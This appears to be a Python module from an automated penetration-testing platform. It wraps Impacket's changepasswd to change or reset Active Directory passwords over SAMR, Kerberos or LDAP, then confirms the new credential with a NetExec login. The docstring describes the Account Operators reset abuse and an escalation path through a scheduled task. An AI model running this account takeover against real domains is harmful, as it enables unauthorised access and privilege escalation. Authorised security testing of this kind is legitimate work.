"""Durable ``nexus.attack.impacket_changepasswd`` handler.

Impacket's ``changepasswd`` (shipped as ``smbpasswd.py`` in older packages)
changes **or resets** an AD account password over SAMR (SMB/RPC), Kerberos or
LDAP. In a Windows engagement this is the primitive behind the classic
*Account Operators* abuse (RUN_sala10 / Ra 2): Account Operators may reset the
password of any **non-protected** account, and once you own such an account you
can write to its home folder, feed a privileged scheduled task and escalate.

Two modes, both explicit:

* **change** — the target account changes its own password: the positional
  carries the account plus its *current* password and no ``-reset`` is used.
* **reset** — a *different*, privileged account performs the reset
  (``-reset`` plus ``-altuser``/``-altpass``/``-althash``). This is a privilege
  abuse, not housekeeping, so it is declared ``HIGH`` risk.

The post-condition is **not** the tool's own banner: after the operation the
handler authenticates with the *new* credential through NetExec (an independent
wire-level proof) and only then reports the reset as verified. A reset that the
server refused stays a declared negative with its output attached.
"""

from __future__ import annotations

import os
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.tools.parsers.netexec import parse_netexec_output

from ._ad import ad_sandbox, resolve_ad_binary, validate_domain, validate_host, validate_username
from ._exec import run_in_sandbox
from ._impacket_resolver import resolve_impacket_binary

CHANGEPASSWD_PROTOCOLS = ("smb-samr", "rpc-samr", "kpasswd", "ldap")
CHANGEPASSWD_DEFAULT_PROTOCOL = "smb-samr"
CHANGEPASSWD_DEFAULT_TIMEOUT_SECONDS = 120
CHANGEPASSWD_MAX_TIMEOUT_SECONDS = 600
CHANGEPASSWD_MIN_PASSWORD_CHARS = 8
CHANGEPASSWD_MAX_PASSWORD_CHARS = 256
#: Markers Impacket prints on a successful change/reset.
CHANGEPASSWD_SUCCESS_MARKERS = ("was changed successfully", "was reset successfully")


def impacket_changepasswd_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for the changepasswd tool."""
    return ToolDefinition(
        tool_id="nexus.attack.impacket_changepasswd",
        name="Impacket changepasswd (AD password change/reset)",
        tenant_id=tenant_id,
        description=(
            "Cambia o RESETEA la contraseña de una cuenta AD con changepasswd de "
            "Impacket (SAMR sobre SMB/RPC, Kerberos o LDAP). Con alt_username/"
            "alt_password actúa un tercero privilegiado (p. ej. un Account "
            "Operator reseteando a un usuario no protegido): es abuso de "
            "privilegios. HIGH. La post-condición se verifica re-autenticando "
            "con la credencial nueva, no con el banner de la herramienta."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "account": {
                    "type": "string",
                    "minLength": 1,
                    "maxLength": 128,
                    "description": "Cuenta cuya contraseña se cambia o resetea.",
                },
                "domain": {"type": "string", "maxLength": 255},
                "new_password": {
                    "type": "string",
                    "minLength": CHANGEPASSWD_MIN_PASSWORD_CHARS,
                    "maxLength": CHANGEPASSWD_MAX_PASSWORD_CHARS,
                },
                "old_password": {
                    "type": "string",
                    "maxLength": 512,
                    "description": (
                        "Contraseña actual de la cuenta, solo para el modo cambio "
                        "(la propia cuenta se cambia la suya)."
                    ),
                },
                "alt_username": {
                    "type": "string",
                    "maxLength": 128,
                    "description": "Cuenta privilegiada que ejecuta el reset.",
                },
                "alt_password": {"type": "string", "maxLength": 512},
                "alt_hash": {"type": "string", "maxLength": 65},
                "protocol": {
                    "type": "string",
                    "enum": list(CHANGEPASSWD_PROTOCOLS),
                    "default": CHANGEPASSWD_DEFAULT_PROTOCOL,
                },
                "timeout_seconds": {
                    "type": "integer",
                    "minimum": 30,
                    "maximum": CHANGEPASSWD_MAX_TIMEOUT_SECONDS,
                },
            },
            "required": ["target", "account", "domain", "new_password"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        effect="exploit",
        required_permissions=["execute:tool:nexus.attack.impacket_changepasswd"],
        timeout_seconds=CHANGEPASSWD_MAX_TIMEOUT_SECONDS * 2,
        max_output_bytes=2_000_000,
        scope_target_field="target",
        scope_required=True,
    )


def validate_new_password(value: Any) -> str:
    """Return a plausible password (bounded, printable, no NUL)."""
    if not isinstance(value, str) or not value.strip():
        raise ValueError("new_password must be a non-empty string")
    if not CHANGEPASSWD_MIN_PASSWORD_CHARS <= len(value) <= CHANGEPASSWD_MAX_PASSWORD_CHARS:
        raise ValueError("new_password length is out of range")
    if "\x00" in value or any(ord(ch) < 0x20 for ch in value):
        raise ValueError("new_password must not contain control characters")
    return value


def _build_positional(domain: str, account: str, old_password: str | None) -> str:
    """Build ``domain/account[:oldpass]@host`` for the tool's positional."""
    prefix = f"{domain}/{account}" if domain else account
    if old_password:
        prefix += f":{old_password}"
    return prefix


def _reset_accepted(stdout: str) -> bool:
    """True when Impacket reported the change/reset as successful."""
    text = (stdout or "").lower()
    return any(marker in text for marker in CHANGEPASSWD_SUCCESS_MARKERS)


async def _verify_new_credential(
    target: str,
    domain: str,
    account: str,
    new_password: str,
    *,
    workspace_root: str,
    timeout_seconds: float,
) -> tuple[bool, dict[str, Any]]:
    """Authenticate with the new credential; the wire answer is the proof."""
    binary = resolve_ad_binary("nxc", "netexec")
    if not binary:
        return False, {"verified_by": "netexec_unavailable"}
    user = f"{domain}\\{account}" if domain else account
    argv = [binary, "smb", target, "-u", user, "-p", new_password]
    if domain:
        argv.extend(["-d", domain])
    result = await run_in_sandbox(
        ad_sandbox(workspace_root, binary),
        argv,
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_NETEXEC_IMAGE",
        default_image="netexec",
    )
    text = f"{result.stdout}\n{result.stderr}"
    parsed = parse_netexec_output(result.stdout, "smb")
    authenticated = any(
        entry.kind == "status" and entry.mark == "+" and account.lower() in entry.text.lower()
        for entry in parsed.entries
    )
    return authenticated, {
        "verified_by": "netexec_smb_login",
        "verification_output_sha256": parsed.raw_output_sha256,
        "verification_exit_code": result.exit_code,
        "verification_stderr": result.stderr[-400:] if not authenticated else "",
        "verification_text_len": len(text),
    }


async def impacket_changepasswd_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Change or reset an AD password through the sandbox, then prove it."""
    target = validate_host(arguments.get("target"))
    account = validate_username(arguments.get("account"), field="account")
    domain = validate_domain(arguments["domain"])
    new_password = validate_new_password(arguments.get("new_password"))
    old_password = str(arguments["old_password"]) if arguments.get("old_password") else None

    alt_username = str(arguments.get("alt_username") or "").strip()
    alt_password = str(arguments["alt_password"]) if arguments.get("alt_password") else None
    alt_hash = str(arguments["alt_hash"]) if arguments.get("alt_hash") else None
    if alt_username and not (alt_password or alt_hash):
        raise ValueError("alt_username requires alt_password or alt_hash")

    protocol = str(arguments.get("protocol") or CHANGEPASSWD_DEFAULT_PROTOCOL).strip().lower()
    if protocol not in CHANGEPASSWD_PROTOCOLS:
        raise ValueError(f"unsupported protocol: {protocol!r}")

    requested_timeout = arguments.get("timeout_seconds")
    timeout_seconds = min(
        CHANGEPASSWD_MAX_TIMEOUT_SECONDS,
        max(30, int(requested_timeout) if requested_timeout else CHANGEPASSWD_DEFAULT_TIMEOUT_SECONDS),
    )

    binary = resolve_impacket_binary("changepasswd") or resolve_impacket_binary("smbpasswd")
    if not binary:
        return ToolResult(verification_method="changepasswd_unavailable")

    reset = alt_username != ""
    positional = _build_positional(domain, account, None if reset else old_password)
    argv = [binary, "-protocol", protocol, "-newpass", new_password]
    if reset:
        argv.append("-reset")
        argv.extend(["-altuser", f"{domain}/{alt_username}" if domain else alt_username])
        if alt_password:
            argv.extend(["-altpass", alt_password])
        if alt_hash:
            argv.extend(["-althash", alt_hash])
    argv.append(f"{positional}@{target}")

    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    result = await run_in_sandbox(
        ad_sandbox(workspace_root, binary),
        argv,
        timeout_seconds=timeout_seconds,
        image_env="NEXUS_IMPACKET_IMAGE",
        default_image="impacket",
    )

    evidence: dict[str, Any] = {
        "target": target,
        "domain": domain,
        "account": account,
        "protocol": protocol,
        "mode": "reset" if reset else "change",
        "performed_by": alt_username or account,
        "timeout_seconds": timeout_seconds,
        "change_accepted": _reset_accepted(result.stdout),
    }
    if result.timed_out:
        return ToolResult(
            output={"error": "changepasswd timed out", "target": target, "account": account},
            verified=False,
            verification_method="changepasswd_timeout",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
            timed_out=True,
        )

    if not evidence["change_accepted"]:
        evidence["error"] = (result.stderr or result.stdout or "")[-400:]
        return ToolResult(
            output={
                "error": "the server did not accept the password change",
                "target": target,
                "account": account,
                "mode": evidence["mode"],
            },
            verified=False,
            verification_method="changepasswd_denied",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )

    authenticated, verification = await _verify_new_credential(
        target, domain, account, new_password,
        workspace_root=workspace_root,
        timeout_seconds=min(120, timeout_seconds),
    )
    evidence.update(verification)
    evidence["verified_by_login"] = authenticated

    output: dict[str, Any] = {
        "target": target,
        "account": account,
        "domain": domain,
        "mode": evidence["mode"],
        "new_password": new_password,
        "verified_by_login": authenticated,
    }
    if not authenticated:
        return ToolResult(
            output=output,
            verified=False,
            verification_method="changepasswd_unverified",
            evidence=evidence,
            exit_code=result.exit_code,
            accepted_exit_codes=(0,),
            stdout=result.stdout,
            stderr=result.stderr,
        )
    return ToolResult(
        output=output,
        verified=True,
        verification_method="changepasswd_verified",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "CHANGEPASSWD_PROTOCOLS",
    "impacket_changepasswd_definition",
    "impacket_changepasswd_handler",
    "validate_new_password",
]
